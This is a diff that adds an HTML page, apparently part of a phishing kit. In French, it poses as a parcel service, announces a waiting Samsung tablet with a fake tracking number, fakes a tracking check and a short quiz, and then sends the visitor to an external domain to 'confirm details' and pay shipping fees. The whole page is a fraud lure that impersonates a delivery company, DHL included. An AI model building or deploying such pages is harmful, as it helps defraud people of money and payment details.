@@ -1,0 +1,112 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>ParcelExpress - Reschedule parcel</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+    <script src="boogierobots.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.2.1/css/bootstrap.min.css" integrity="sha384-GJzZqFGwb1QTTN6wy59ffF1BuGJpLSa9DkKMp0DgiMDm4iYMj70gZWKYbI706tWS" crossorigin="anonymous">
+  
+    <link rel="stylesheet" href="style.css">
+
+    <script src="https://kit.fontawesome.com/ac2de647c8.js" crossorigin="anonymous"></script>
+
+</head>
+
+<body>
+<div class="body-content">
+    <div class="table-wrapper">
+        <div class="table-content">
+            <div class="table-header">
+                <h1>COLIS EN ATTENTE</h1>
+            </div>
+            <div class="table-main">
+                <div class="table-box">
+                    <img src="files/box.png">
+                </div>
+                <div class="table-main-content-wrapper">
+                    <div class="table-main-content main1">
+                        <p>Vous avez (1) colis en attente, prêt pour la livraison. Utilisez votre code pour suivre et réceptionner votre colis.</p>
+                        <p>Produit: <strong>Samsung Galaxy Tab A</strong></p>
+                        <hr>
+                        <p>Votre numéro de suivi</p>
+                        <p><span class="tracking-number">Sam022QXw</span></p>
+                        <p>Reprogrammer ici:</p>
+                        <button class="button reschedule">Suivre votre colis</button>
+                    </div>
+                    <div class="table-main-content main2">
+                        <div class="spinner"></div>
+
+                        <ul class="loading-list">
+                            <li>Suivi de votre colis...</li>
+                            <li>Trouver votre numéro de suivi...</li>
+                            <li>Recherche d'options de livraison...</li>
+                        </ul>
+                    </div>
+                    <div class="table-main-content main3">
+                        <p>Statut:</p>
+                        <p><span class="date">Prêt pour la livraison</span></p>
+                        <hr>
+                        <p>Pour programmer la livraison, nous devrons vous poser quelques questions.</p>
+                        <button class="button questions">Planifier la livraison</button>
+                    </div>
+                    <div class="table-main-content main4">
+                        <p class="question"></p>
+                        <div class="question__answers">
+                            <input type="radio">
+                            <label id="q1">
+                                <span></span>
+                            </label>
+
+                            <input type="radio">
+                            <label id="q2">
+                                <span></span>
+                            </label>
+                            <input type="radio">
+                            <label id="q3">
+                                <span></span>
+                            </label>
+                        </div>
+                    </div>
+                    <div class="table-main-content main5">
+                        <p>Merci d'avoir enregistré vos réponses !</p>
+                        <p>Votre nouvelle Tablet sera livrée le :<br> <strong> <span class="deliveryTime"></span> et <span class="parcelLocation"></span></strong>.</p>
+                        <hr>
+                        <p>Délai de livraison prévu: <strong>3 jours avec DHL</strong></p>
+                        <button class="button final product-button" data-product-id="1">Confirmer vos détails</button>
+                        <script type="text/javascript">
+
+                            function ActionRedirect(action){
+                                window.location.replace(ffdomain);
+                            }
+
+                            $(document).ready(function(){
+                                $('.product-button').on('click', function(e){
+                                    e.preventDefault();
+                                    var id = $(this).data('product-id');
+                                    ActionRedirect(id);
+                                });
+                            });
+
+                        </script>
+
+                        <p style="font-size: 10px; margin-top: 10px;">*Merci de confirmer vos détails de livraison et payer les frais d'expédition sur la page suivante</p>
+                    </div>
+                </div>
+            </div>
+            <div class="table-footer">
+            </div>
+        </div>
+    </div>
+</div>
+</body>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.25.3/moment.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/moment.js/2.25.3/locale/fr.min.js"></script>
+<script src="app.js"></script>
+
+</html>
